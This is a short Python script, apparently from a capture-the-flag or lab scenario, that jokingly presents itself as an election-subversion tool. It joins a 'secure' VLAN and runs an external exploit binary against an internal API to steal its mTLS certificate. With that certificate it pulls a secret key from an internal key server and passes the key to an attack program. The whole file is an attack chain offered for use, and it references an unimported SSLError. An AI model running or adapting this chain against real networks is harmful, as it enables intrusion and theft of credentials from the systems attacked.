#!/usr/bin/python3
import subprocess
import os
import requests
print("Welcome to Auto Elect!".center(70,"="))
print("Is democracy too inconvenient? We've got you covered.\nRemember to run as root!\n")
print("Registering interface on secure vlan...")
status = 0
status |= os.system("sudo ip link add link ens3 name ens3.10 type vlan id 10")
status |= os.system("sudo ip addr  add dev ens3.10 172.16.10.200/24")
status |= os.system("sudo ip link set dev ens3.10 up")
if status:
    raise ChildProcessError("Could not register address on secure vlan. Abort!")
print("Registered.\nLaunching MTLS Exploiter...\n")
status |= os.system("sudo ./exploit -d api.internal")
if status:
    raise ChildProcessError("Exploit binary failed!")
try:
    key = requests.get("https://keyserver.internal", cert=("api.internal-crt.pem","api.internal-key.pem")).text
except(SSLError):
    raise FileNotFoundError("API certificate and key do not exist in this dir, did exploit fail?")
print("I found the API's secret key! It's ",key)
print("Launching final attack phase...")
os.system("./cookie-monster {}".format(key))
print("Thank you for choosing us to subvert your election <3")